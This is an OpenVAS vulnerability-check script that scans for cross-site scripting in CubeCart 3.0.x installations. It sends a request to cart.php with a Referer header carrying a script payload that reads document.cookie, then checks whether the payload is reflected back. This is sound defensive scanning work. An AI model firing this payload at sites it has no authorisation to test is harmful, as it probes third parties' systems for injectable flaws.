###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cubecart_mult_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# CubeCart Multiple Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:cubecart:cubecart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803090");
  script_version("$Revision: 13659 $");
  script_bugtraq_id(57031);
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-12-25 15:26:41 +0530 (Tue, 25 Dec 2012)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("CubeCart Multiple Vulnerabilities");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_cubecart_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("cubecart/installed");

  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Dec/128");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/119041");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/233");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/234");
  script_xref(name:"URL", value:"http://www.cubecart.com");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected
  site and manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"CubeCart version 3.0.x through 3.0.20.");

  script_tag(name:"insight", value:"Inputs passed via multiple parameters to 'index.php', 'cart.php' and Admin
  Interface is not properly sanitised before it is returned to the user.");

  script_tag(name:"solution", value:"Upgrade to CubeCart version 5.0 or later.");

  script_tag(name:"summary", value:"This host is installed with CubeCart and is prone to multiple
  vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

useragent = http_get_user_agent();
host = http_host_name( port:port );

url = dir + '/cart.php?act=cart';
req = string( 'GET ', url, ' HTTP/1.1\r\n',
              'Host: ', host, '\r\n',
              'User-Agent: ', useragent, '\r\n',
              'Referer: "/><script>alert(document.cookie)</script>\r\n\r\n' );
res = http_keepalive_send_recv( port:port, data:req );

if( res && res =~ "^HTTP/1\.[01] 200" &&
    "Powered by CubeCart" >< res && "Devellion Limited" >< res &&
    "><script>alert(document.cookie)</script>" >< res ) {
  report = report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit(0);
}

exit(99);
